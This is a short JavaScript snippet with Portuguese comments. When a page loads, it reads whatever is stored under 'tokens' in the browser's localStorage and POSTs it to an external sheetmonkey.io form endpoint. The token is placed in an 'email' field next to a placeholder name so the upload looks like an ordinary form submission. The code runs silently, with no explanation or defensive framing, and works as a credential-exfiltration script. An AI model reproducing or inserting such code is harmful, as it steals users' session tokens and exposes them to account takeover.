document.addEventListener("DOMContentLoaded",async function(){
    let muda=localStorage.getItem("tokens")
    const url = "https://api.sheetmonkey.io/form/aMg4Fau8yyiKVsRUqCSS8N";  // Cole a URL do Apps Script

    const dados = {
        nome: "João Silva",
        email: `${muda}`
    };

    fetch(url, {
        method: "POST",
        body: JSON.stringify(dados),
        headers: {
            "Content-Type": "application/json"
        }
    })
    .then(response => response.json())
    .then(data => console.log("Resposta:", data))
    .catch(error => console.error("Erro:", error));

})